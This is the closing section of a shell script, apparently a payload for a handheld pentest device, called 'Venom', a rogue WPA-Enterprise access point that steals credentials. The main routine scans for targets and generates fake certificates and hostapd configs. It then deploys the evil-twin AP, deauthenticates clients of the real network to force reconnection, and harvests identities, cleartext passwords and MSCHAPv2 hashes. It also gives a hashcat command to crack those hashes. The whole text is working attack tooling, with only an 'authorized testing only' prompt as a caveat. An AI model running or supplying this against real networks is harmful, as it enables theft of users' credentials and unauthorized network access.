    if [ "$MSCHAPV2_COUNT" -gt 0 ]; then
        LOG ""
        LOG yellow "Crack MSCHAPv2 hashes:"
        LOG yellow "  hashcat -m 5500 hashcat_5500.txt wordlist.txt"
    fi

    local total=$((IDENTITY_COUNT + CLEARTEXT_COUNT + MSCHAPV2_COUNT))

    if [ "$total" -gt 0 ]; then
        VIBRATE
        sleep 0.3
        VIBRATE
        sleep 0.3
        VIBRATE
        play_complete
        ALERT "VENOM COMPLETE!\n\nIdentities: $IDENTITY_COUNT\nCleartext: $CLEARTEXT_COUNT\nMSCHAPv2: $MSCHAPV2_COUNT\n\nLoot saved"
    else
        play_fail
        ALERT "VENOM COMPLETE\n\nNo credentials captured\n\nRaw logs saved to:\n$SESSION_DIR"
    fi
}

# ============================================
# MAIN EXECUTION
# ============================================

LOG ""
LOG red " __   _____ _  _  ___  __  __ "
LOG red " \\ \\ / / __| \\| |/ _ \\|  \\/  |"
LOG red "  \\ V /| _|| .\` | (_) | |\\/| |"
LOG red "   \\_/ |___|_|\\_|\\___/|_|  |_|"
LOG ""
LOG red "  WPA-Enterprise Credential Harvester"
LOG red "  v1.0"
LOG ""

# Confirm start
resp=$(CONFIRMATION_DIALOG "Start Venom?\n\nDeploys rogue WPA-Enterprise\nAP to capture credentials\n\nAuthorized testing only!")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "User declined"
    exit 0
fi

# Create directories
mkdir -p "$LOOT_DIR" "$TEMP_DIR"

# Session directory
SESSION_DIR="$LOOT_DIR/session_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$SESSION_DIR"
SESSION_LOG="$SESSION_DIR/session.log"
START_TIME=$(date +%s)

# ── PHASE 0: DEPS ──────────────────────────
LOG blue "=== PHASE 0: DEPENDENCIES ==="
check_deps || exit 1

# ── PHASE 1: RECON ─────────────────────────
LOG ""
LOG blue "=== PHASE 1: RECON ==="
led_recon

scan_enterprise_networks

if [ "$ENTERPRISE_COUNT" -gt 0 ]; then
    if ! select_target; then
        # User pressed B for manual entry
        if ! manual_target_entry; then
            LOG "Cancelled"
            exit 0
        fi
    fi
else
    LOG yellow "No enterprise APs found"

    resp=$(CONFIRMATION_DIALOG "No enterprise APs found.\nEnter SSID manually?")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 0
            ;;
    esac

    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        if ! manual_target_entry; then
            LOG "Cancelled"
            exit 0
        fi
    else
        exit 0
    fi
fi

logboth green "Target: $TARGET_SSID (Ch $TARGET_CHANNEL)"

# ── PHASE 2: SETUP ─────────────────────────
LOG ""
LOG blue "=== PHASE 2: SETUP ==="
led_setup

generate_certs || {
    ERROR_DIALOG "Certificate generation\nfailed"
    exit 1
}

create_virtual_interface || {
    ERROR_DIALOG "Failed to create\nvirtual interface"
    exit 1
}

write_eap_user_file || {
    ERROR_DIALOG "EAP config failed"
    exit 1
}

write_hostapd_config "$TARGET_SSID" "$TARGET_CHANNEL" || {
    ERROR_DIALOG "hostapd config failed"
    exit 1
}

logboth green "Setup complete"

# Confirm deployment
resp=$(CONFIRMATION_DIALOG "Deploy rogue AP?\n\nSSID: $TARGET_SSID\nChannel: $TARGET_CHANNEL\n\nThis starts the attack")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Deployment cancelled"
    exit 0
fi

# ── PHASE 3: DEPLOY ────────────────────────
LOG ""
LOG blue "=== PHASE 3: DEPLOY ==="
led_deploy

start_hostapd || {
    ERROR_DIALOG "hostapd failed\nCheck logs at:\n$HOSTAPD_LOG"
    exit 1
}

start_capture

deauth_target_clients

VIBRATE
live_monitor

# ── PHASE 4: HARVEST ───────────────────────
LOG ""
LOG blue "=== PHASE 4: HARVEST ==="

harvest_results

LOG ""
LOG green "Venom complete"
exit 0
